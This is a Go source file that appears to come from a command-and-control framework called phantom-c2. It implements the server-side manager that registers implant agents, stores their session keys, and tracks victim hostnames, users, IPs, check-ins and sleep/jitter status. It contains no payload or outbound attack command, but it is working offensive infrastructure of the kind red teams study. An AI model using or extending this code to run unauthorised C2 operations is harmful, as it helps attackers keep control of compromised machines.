package agent

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/util"
)

// Manager tracks active agents and their session keys.
type Manager struct {
	mu          sync.RWMutex
	sessionKeys map[string][]byte // agentID -> AES session key (memory only)
	database    *db.Database
	defSleep    int
	defJitter   int
}

// NewManager creates a new agent manager.
func NewManager(database *db.Database, defaultSleep, defaultJitter int) *Manager {
	return &Manager{
		sessionKeys: make(map[string][]byte),
		database:    database,
		defSleep:    defaultSleep,
		defJitter:   defaultJitter,
	}
}

// Register creates a new agent from a registration request.
// Returns the agent record and stores the session key in memory.
func (m *Manager) Register(req *protocol.RegisterRequest, sessionKey []byte, externalIP, listenerID string) (*db.Agent, error) {
	now := time.Now()

	// Deduplicate: if an agent with the same hostname+username already exists, reuse it
	existing, _ := m.database.GetAgentByHostnameUser(req.Hostname, req.Username)
	if existing != nil {
		existing.ExternalIP  = externalIP
		existing.InternalIP  = req.InternalIP
		existing.PID         = req.PID
		existing.ProcessName = req.ProcessName
		existing.Arch        = req.Arch
		existing.LastSeen    = now
		existing.Status      = protocol.AgentActive
		existing.ListenerID  = listenerID
		_ = m.database.UpdateAgent(existing)

		m.mu.Lock()
		m.sessionKeys[existing.ID] = sessionKey
		m.mu.Unlock()
		return existing, nil
	}

	// New agent — generate ID and name
	agentID := uuid.New().String()
	name := strings.ToLower(req.Hostname)
	if name == "" {
		name = "agent"
	}
	baseName := name
	for i := 1; i <= 20; i++ {
		dup, _ := m.database.GetAgentByName(name)
		if dup == nil {
			break
		}
		name = fmt.Sprintf("%s-%d", baseName, i)
	}

	agent := &db.Agent{
		ID:          agentID,
		Name:        name,
		ExternalIP:  externalIP,
		InternalIP:  req.InternalIP,
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		Arch:        req.Arch,
		PID:         req.PID,
		ProcessName: req.ProcessName,
		Sleep:       m.defSleep,
		Jitter:      m.defJitter,
		FirstSeen:   now,
		LastSeen:    now,
		Status:      protocol.AgentActive,
		ListenerID:  listenerID,
	}

	if err := m.database.InsertAgent(agent); err != nil {
		return nil, err
	}

	m.mu.Lock()
	m.sessionKeys[agentID] = sessionKey
	m.mu.Unlock()
	return agent, nil
}

// CheckIn updates the agent's last seen time and returns its status.
func (m *Manager) CheckIn(agentID string) error {
	return m.database.UpdateAgentLastSeen(agentID, time.Now(), protocol.AgentActive)
}

// GetSessionKey retrieves the AES session key for an agent.
func (m *Manager) GetSessionKey(agentID string) ([]byte, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	key, ok := m.sessionKeys[agentID]
	return key, ok
}

// FindAgentByKeyID finds an agent by matching the first 8 bytes of SHA-256(sessionKey).
func (m *Manager) FindAgentByKeyID(keyID [8]byte) (string, []byte, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	for agentID, key := range m.sessionKeys {
		id := util.SessionKeyIDFromKey(key)
		if id == keyID {
			return agentID, key, true
		}
	}
	return "", nil, false
}

// List returns all agents from the database.
func (m *Manager) List() ([]*db.Agent, error) {
	return m.database.ListAgents()
}

// Get retrieves a single agent by ID or name.
func (m *Manager) Get(idOrName string) (*db.Agent, error) {
	// Try by ID first
	a, err := m.database.GetAgent(idOrName)
	if err != nil {
		return nil, err
	}
	if a != nil {
		return a, nil
	}
	// Try by name
	return m.database.GetAgentByName(idOrName)
}

// Remove removes an agent and its session key.
func (m *Manager) Remove(agentID string) error {
	m.mu.Lock()
	delete(m.sessionKeys, agentID)
	m.mu.Unlock()
	return m.database.DeleteAgent(agentID)
}

// UpdateSleep updates an agent's sleep/jitter settings.
func (m *Manager) UpdateSleep(agentID string, sleep, jitter int) error {
	return m.database.UpdateAgentSleep(agentID, sleep, jitter)
}

// RefreshStatuses checks all agents and marks dormant/dead based on last seen.
func (m *Manager) RefreshStatuses() error {
	agents, err := m.database.ListAgents()
	if err != nil {
		return err
	}

	now := time.Now()
	for _, a := range agents {
		if a.Status == protocol.AgentDead {
			continue
		}

		elapsed := now.Sub(a.LastSeen)
		threshold := time.Duration(a.Sleep) * time.Second

		var newStatus string
		// Use generous thresholds to avoid false dormant/dead during long-running tasks
		// Minimum thresholds: 5 minutes for dormant, 15 minutes for dead
		dormantThreshold := threshold * 5
		if dormantThreshold < 5*time.Minute {
			dormantThreshold = 5 * time.Minute
		}
		deadThreshold := threshold * 20
		if deadThreshold < 15*time.Minute {
			deadThreshold = 15 * time.Minute
		}
		switch {
		case elapsed > deadThreshold:
			newStatus = protocol.AgentDead
		case elapsed > dormantThreshold:
			newStatus = protocol.AgentDormant
		default:
			newStatus = protocol.AgentActive
		}

		if newStatus != a.Status {
			m.database.UpdateAgentLastSeen(a.ID, a.LastSeen, newStatus)
		}
	}
	return nil
}
